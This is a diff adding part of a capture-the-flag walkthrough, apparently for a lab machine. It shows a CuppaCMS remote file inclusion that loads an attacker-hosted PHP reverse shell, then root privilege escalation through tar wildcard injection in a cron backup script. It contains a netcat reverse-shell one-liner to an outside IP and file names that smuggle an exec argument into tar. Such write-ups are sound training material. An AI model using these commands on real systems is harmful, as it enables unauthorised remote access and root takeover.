@@ -89,3 +89,53 @@ In a notes folder, we can retrieve an important.txt containing :
 3. Spend more time with my wife
 ```
 
+On the /45kra24zxs28v3yd endpoint, we can see a CUPPACMS running.</br>
+Checking online, we can find an exploit for this cms :<br>
+> https://www.exploit-db.com/exploits/25971
+
+It's an LFI/RFI exploit, the webserver will load an external php file if the urlConfig parameter is set we accessing /alerts/alertConfigField.php<br>
+We will host a php reverse shell like the pentestmonkey one.
+In the same directory as our modified php reverse shell, we start a python webserver :<br>
+> python3 -m http.server
+
+And setup a listener<br>
+> nc -lvp <YOUR_PORT>
+
+Then, we make the remote server request and execute our shell accessing at :<br>
+> http://10.10.110.22/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.27.215:8000/shell.php
+
+
+## Privesc
+
+One logged, when exploring the system, we can see a weird crontab running using :
+> cat /etc/crontab
+
+```
+*/1 *    * * *   root    /home/milesdyson/backups/backup.sh
+```
+This script is executed as root every minutes.<br>
+Let's find what it do.<br>
+
+```
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+The script create a backup of the /var/www/html folder to a backup.tgz archive.<br>
+Using [gtfobins](https://gtfobins.github.io/), we find that we can abuse of tar to execute a script<br>
+And since the script is running as root, if we can make it execute a reverse shell to our machine, it will run as root<br>
+When scanning the folder to backup, if tar find a file which is named as one of his arguments like "--checkpoint=1" and "--checkpoint-action=exec=/binsh"<br>
+Then tar will execute it, --checkpoint=1 and --checkpoint-action=exec=OUR_PAYLOAD will execute our payload<br>
+Let's create an netcat reverse shell script using https://www.revshells.com/<br>
+Enter your attacker ip and port and we get a command like :<br>
+> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.26.190 4444 >/tmp/f
+
+Save it on a shell.sh file on the target.<br>
+Make it executable.<br>
+> chmod +x shell.sh
+
+Put the --checkpoint=1 file in the /var/www/html<br>
+> echo "" > --checkpoint=1
+
+> echo "" > "--checkpoint-action=exec=sh shell.sh"
+We can then get the reverse shell using a netcat listener.
